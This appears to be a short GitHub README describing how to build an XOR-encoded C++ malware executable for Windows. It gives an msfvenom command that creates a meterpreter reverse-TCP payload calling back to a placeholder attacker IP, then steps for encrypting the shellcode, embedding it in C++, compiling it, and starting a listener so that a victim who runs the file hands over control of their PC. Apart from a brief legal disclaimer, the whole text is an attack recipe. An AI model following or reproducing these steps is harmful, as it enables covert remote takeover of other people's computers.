# Malware-in-cplus-plus
This is a basic encoded c++ malware with an encoded python xored payload
Illegal use of of this process may lead to arrest and individual is resposible for misuse of this program



1. Create a payload using msfvenom using the command:
msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST="AttackerIP" LPORT="AttackerPort" -f raw -o raw.txt

2. Pass this through the python script that will run the XOR encryption through this output and spits out the encrypted version of the shellcode.

3. Run Python script pass the raw payload and output the XOR encrypted payload
python xor_encryptor.py raw.txt > xor_output.txt

4.  This output is to be copied and pasted  in the c++ file (main.cpp). The code for main.cpp is as follows:
Copy the xor_output in this script "char b[] = {};"

5. Compile the above C++ file into Portable Windows Executable using  Dev C++ or Visual Studio

6.  Malicious File has been Created. Now its time to start METERPRETER LISTNER on our attacker machine( KALI) / Use empire to setup listener

7. Click on the Malicious EXE file and BOOOM we got the victims PC control on our KALI MACHINE
